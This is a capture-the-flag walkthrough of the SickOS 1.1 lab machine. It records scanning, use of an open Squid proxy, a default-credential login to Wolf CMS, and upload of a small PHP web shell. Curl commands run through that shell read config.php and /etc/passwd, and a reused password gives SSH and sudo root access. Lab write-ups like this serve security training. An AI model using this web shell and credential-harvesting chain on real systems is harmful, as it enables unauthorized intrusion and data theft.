### Sick OS 1.1 CTF

The objective of [Sick OS CTF](http://www.vulnhub.com/entry/sickos-11,132/) is to get `/root/a0216ea4d51874464078c618298b1367.txt`.

Further information about CTF mentions that this CTF is similar to what one has to work with during OSCP course. Sounds like a fun.

After reading the description and having run the given file on VMWare Player, I first wanted to know the IP Address.

I didn't know a quickest way to identify my target IP address. I was on a network with 100s of PCs so I scanned through the `vmnet8` interface that VMWare must have created to see if it can give quick hint to me.
```shell
$ arp-scan --localnet --interface vmnet8
Interface: vmnet8, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.8.1 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
172.16.8.254	00:50:56:fc:f4:ff	VMware, Inc.
```

Now, I know that the guests I run on VMWare might have VMWare, Inc. signature that would help me reduce the scope.

```shell
$ arp-scan --localnet --interface eno1 | grep "VMware"
192.168.168.181	00:0c:29:7b:51:b0	VMware, Inc.
```

We got the target IP now and I ran nmap against it.
```shell
$ nmap -A 192.168.168.181

Starting Nmap 6.47 ( http://nmap.org ) at 2016-02-22 15:19 CST
Nmap scan report for 192.168.168.181
Host is up (0.00022s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-methods: No Allow or Public header in OPTIONS response (status code 400)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:  GET HEAD
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
MAC Address: 00:0C:29:7B:51:B0 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 - 3.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.168.181

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.41 seconds
```

ssh and squid, that looks interesting and 8080 but not accessible. But, hey did you see that 3128/tcp port is open and is potentially open proxy? I updated my firefox proxy settings to use this proxy and visited http://127.0.0.1 (You have to remove the entries of 127.0.0.1 and/or localhost from `No Proxies for:` textarea in Firefox settings).

![Localhost](images/sickos-1.png?raw=true "Localhost : Sick OS")

That's good for us. I have a habit of usually loading `/robots.txt` before I run the tools like `nikto` or any other directory busting tools. And, it revealed the following information:
```shell
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

I went ahead and visited [http://127.0.0.1/wolfcms/](http://127.0.0.1/wolfcms/) and it loads Wolf CMS. Awesome. Doing some search online revelead that the admin panel could be accessed at [http://127.0.0.1/wolfcms/?admin](http://127.0.0.1/wolfcms/?admin) which did. I also saw that there were couple of exploits out there for Wolf CMS and one of them: [Arbitrary File Upload](https://www.exploit-db.com/exploits/36818/) caught my eyes and I began wondering if I could log into the system as the exploit required one to be authenticated. I had checked wolfcms site so I tried to login with `admin:demo123` but it didn't work. Then, there come two default guesses: `admin:admin` and `admin:password` before getting deeper into any bruteforcing. And, boooom! `admin:admin` worked like a charm. Easy, huh?

Now, the fun begins after getting access to the admin panel. I wrote a simple PHP shell to see if we will have PHP scripts interpreted. Remember earlier we had seen on nmap scan that we could have apache running.

```PHP
<?php
if (isset($_GET['cmd'])) {
  print(shell_exec($_GET['cmd']));
}
```

Tried if I can directly see the content of the file we're looking for but it returns nothing.
```shell
$ curl --proxy http://192.168.168.181:3128 "http://127.0.0.1/wolfcms/public/lol.php?cmd=cat%20/root/a0216ea4d51874464078c618298b1367.txt"
```

That didn't work, as I expected. My next bet was to see the configuration files for wolfcms. Few requests gave me the idea that we've configuration at `/var/www/wolfcms/config.php` but it would return a blank page with `cat` command to me. The following didn't work either.

```shell
$ curl --proxy http://192.168.168.181:3128 "http://127.0.0.1/wolfcms/public/lol.php?cmd=while%20read%20line;%20do%20echo%20%22$line%22;%20done%20%3C%20%20/var/www/wolfcms/config.php"
```

I thought of giving `tail` a try and it worked.

```shell
$ curl --proxy http://192.168.168.181:3128 "http://127.0.0.1/wolfcms/public/lol.php?cmd=tail%20-n200%20/var/www/wolfcms/config.php"
---redacted---
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
---redacted---
```

I remembered that port 22 had OpenSSH running so went there to try but it gave me `permission denied` when I tried with `root` user. But, I had the content of `/etc/passwd` which revealed the users in the OS.

```shell
$ curl --proxy http://192.168.168.181:3128 "http://127.0.0.1/wolfcms/public/lol.php?cmd=cat%20/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
```

So, I tried to ssh as `sickos` user using password `john@123` and boom, we're in. The user had sudo access and we got the password.

```shell
$ ssh sickos@192.168.168.181
sickos@192.168.168.181's password:
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Feb 23 20:20:10 IST 2016

  System load:  0.0               Processes:           112
  Usage of /:   4.3% of 28.42GB   Users logged in:     1
  Memory usage: 16%               IP address for eth0: 192.168.168.181
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

124 packages can be updated.
92 updates are security updates.

New release '14.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Feb 23 20:19:23 2016 from 192.168.168.70
sickos@SickOs:~$ sudo su
[sudo] password for sickos:
root@SickOs:/home/sickos# cat /root/
a0216ea4d51874464078c618298b1367.txt  .bashrc                               .mysql_history                        .viminfo                              
.bash_history                         .cache/                               .profile                              
root@SickOs:/home/sickos# cat /root/a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying


root@SickOs:/home/sickos#
```

Game Over!
